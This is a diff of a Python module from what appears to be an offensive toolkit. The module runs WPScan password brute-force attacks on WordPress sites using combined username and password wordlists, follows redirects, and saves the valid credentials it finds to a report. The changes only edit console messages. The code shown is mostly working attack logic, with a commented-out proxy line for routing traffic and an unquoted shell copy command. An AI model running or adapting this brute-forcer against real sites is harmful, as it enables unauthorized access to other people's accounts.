@@ -15,7 +15,6 @@ def run_wpscan_attack_file(target, usernames_file, passwords_file, success_file)
         # "--proxy", "socks5://35.180.42.196:1080",
         "--update"
     ]
-    print(f"[*] Running WPScan: {' '.join(command)}")
     result = subprocess.run(command, capture_output=True, text=True)
     output = result.stdout + "\n" + result.stderr
 
@@ -24,7 +23,7 @@ def run_wpscan_attack_file(target, usernames_file, passwords_file, success_file)
         match = re.search(r"redirects to:?\s*(\S+)", output, re.IGNORECASE)
         if match:
             new_url = match.group(1).rstrip('/.')
-            print(f"[*] New URL detected: {new_url}. Re-running WPScan on the new URL...")
+            print(f"[+] New URL detected: {new_url}. Re-running on the new URL...")
             return run_wpscan_attack_file(new_url, usernames_file, passwords_file, success_file)
         else:
             print("[!] Could not extract the new URL to re-run WPScan.")
@@ -39,7 +38,6 @@ def run_wpscan_attack_file(target, usernames_file, passwords_file, success_file)
                 sf.write(f"Valid credentials found in WordPress: {username}:{password}\n")
         return len(success_matches)
     else:
-        print("[-] WPScan: No valid credentials found in this attempt.")
         return 0
 
 def wordpress_bruteforce(target):
@@ -70,14 +68,14 @@ def wordpress_bruteforce(target):
             try:
                 with open(user_file, "r", encoding="utf-8") as f:
                     users_custom = [line.strip() for line in f if line.strip()]
-                print(f"[*] Loaded {len(users_custom)} custom users from {user_file}")
+                print(f"[+] Loaded {len(users_custom)} custom users from {user_file}")
             except Exception as e:
                 print(f"[!] Error reading {user_file}: {e}")
         if os.path.isfile(pass_file):
             try:
                 with open(pass_file, "r", encoding="utf-8") as f:
                     pass_custom = [line.strip() for line in f if line.strip()]
-                print(f"[*] Loaded {len(pass_custom)} custom passwords from {pass_file}")
+                print(f"[+] Loaded {len(pass_custom)} custom passwords from {pass_file}")
             except Exception as e:
                 print(f"[!] Error reading {pass_file}: {e}")
 
@@ -92,7 +90,7 @@ def wordpress_bruteforce(target):
             try:
                 with open(default_pass_file, "r", encoding="utf-8") as f:
                     default_passwords = [line.strip() for line in f if line.strip()]
-                print(f"[*] Loaded {len(default_passwords)} default passwords from {default_pass_file}")
+                print(f"[+] Loaded {len(default_passwords)} default passwords from {default_pass_file}")
                 accumulated_passwords.update(default_passwords)
             except Exception as e:
                 print(f"[!] Error reading {default_pass_file}: {e}")
@@ -109,7 +107,7 @@ def wordpress_bruteforce(target):
         try:
             with open(default_combo_file, "r", encoding="utf-8") as f:
                 combos = [line.strip() for line in f if line.strip()]
-            print(f"[*] Loaded {len(combos)} combos from {default_combo_file}")
+            print(f"[+] Loaded {len(combos)} combos from {default_combo_file}")
         except Exception as e:
             print(f"[!] Error reading {default_combo_file}: {e}")
             combos = []
@@ -140,7 +138,7 @@ def wordpress_bruteforce(target):
                 tmp_pass.write(pwd + "\n")
             tmp_pass_file = tmp_pass.name
 
-        print("[*] Running WPScan attack with the combined user and password lists...")
+        print("[*] Running attack with the combined lists...")
         total_found = run_wpscan_attack_file(target, tmp_users_file, tmp_pass_file, success_file)
 
         # Remove the temporary files
@@ -151,19 +149,21 @@ def wordpress_bruteforce(target):
         total_found = 0
 
     if total_found > 0:
-        print(f"[+] Brute force completed. A total of {total_found} valid credential(s) were found.")
+        print(f"[+] Bruteforce completed. A total of {total_found} valid credential(s) were found.")
         # Copy the success file to logs/<target>/report/wordpress_credentials.txt
         report_dir = os.path.join("logs", target_clean, "report")
         os.makedirs(report_dir, exist_ok=True)
         report_file = os.path.join(report_dir, "wordpress_credentials.txt")
         os.system(f"cp {success_file} {report_file}")
     else:
-        print("[-] Brute force completed without finding valid credentials.")
+        print("[+] Bruteforce completed without finding valid credentials.")
         with open(success_file, "w", encoding="utf-8") as sf:
             sf.write("No valid credentials were found in WordPress.")
 
 def run_http_wordpress_bruteforce(target):
+    print("[*] Running WordPress bruteforce module...")
     wordpress_bruteforce(target)
+    print("[+] WordPress bruteforce module completed.")
 
 if __name__ == "__main__":
     target = sys.argv[1]
